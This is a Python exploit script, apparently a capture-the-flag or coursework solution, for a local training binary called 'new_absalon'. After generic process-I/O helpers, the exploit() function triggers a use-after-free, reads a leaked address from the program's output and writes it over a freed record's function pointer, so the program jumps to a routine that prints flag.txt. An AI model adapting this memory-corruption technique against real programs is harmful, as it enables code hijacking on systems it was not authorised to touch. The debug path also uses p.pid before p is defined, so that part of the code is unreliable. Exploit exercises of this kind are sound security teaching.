#!/usr/bin/env python3
import subprocess, select, sys, struct
import re


# Small library of functions you might find useful
##################################################

# pause the exploit (e.g. to wait for a gdb attach)
def pause(p):
    input(f"""Run 'gdb --pid {p.pid}' in another terminal.
              Press Enter to continue.""")

# let the user interact with the process
def interact(p):
    try:
        while True:
            readable, writable, exceptional = select.select([sys.stdin.buffer, p.stdout], [], [])

            # stdin -> process
            if sys.stdin.buffer in readable:
                buf = sys.stdin.buffer.read1()
                if not buf:
                    break
                p.stdin.write(buf)
                p.stdin.flush()

            # process -> stdout
            if p.stdout in readable:
                buf = p.stdout.read(4096)
                if not buf:
                    break
                sys.stdout.buffer.write(buf)
                sys.stdout.flush()
    except (EOFError, KeyboardInterrupt) as e:
        pass

# read `count` bytes from the process
def readn(p, count):
    res = b''
    while len(res) < count:
        cur = p.stdout.read(count - len(res))
        if not cur:
            break
        res += cur
    return res

# read bytes from the process until a needle is found
def read_until(p, needle):
    res = b''
    while not res.endswith(needle):
        cur = readn(p, 1)
        if not cur:
            break
        res += cur
    return res

# read a line from the process
def read_line(p):
    l = read_until(p, b'\n')
    return l[:-1] if l.endswith(b"\n") else l

# write a string to the process
def write(p, s):
    p.stdin.write(s)
    p.stdin.flush()

# End of lib #####################################

def send_message(p, msg):
    write(p, b"l")
    read_until(p, b"but you can try anyways: \n")
    write(p, msg)

def exploit(p):
    # first, we subscribe to expose secrets, inquire to graduate
    # to deallocate student, and then query to leave a message.
    write(p, b"siyl")

    # extract secret address!
    # a bunch of lines will have been printed at this point, so we simply read
    # everything and assume that the output contains exactly one hexadecimal
    # number, which we extract using regex.
    secrets = read_until(p, b"you can try anyways: \n")

    if not (addr_match := re.search(br"0x[0-9a-fA-F]+", secrets)):
        raise ValueError("Failed to extract secrets")
    addr_bytes = int(addr_match[0], 16).to_bytes(8, "little")

    # now, we send the secret address as a message, which is then
    # written on top of the previous student->action. This is followed by
    # a call to doAction(student), jumping to the secret address.
    write(p, addr_bytes)

    flag_contents = str(read_line(p), encoding = "ascii")
    print(f"first line of flag.txt: \"{flag_contents}\"")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(prog = "new_absalon")
    parser.add_argument("-d", "--debug", action = "store_true")
    args = parser.parse_args()

    if args.debug:
        input(f"pid: {p.pid} (waiting for gdb attachment; enter to continue)")
    p = subprocess.Popen('./new_absalon',
                         stdin = subprocess.PIPE,
                         stdout = subprocess.PIPE,
                         bufsize = 0)
    exploit(p)
    #  interact(p)
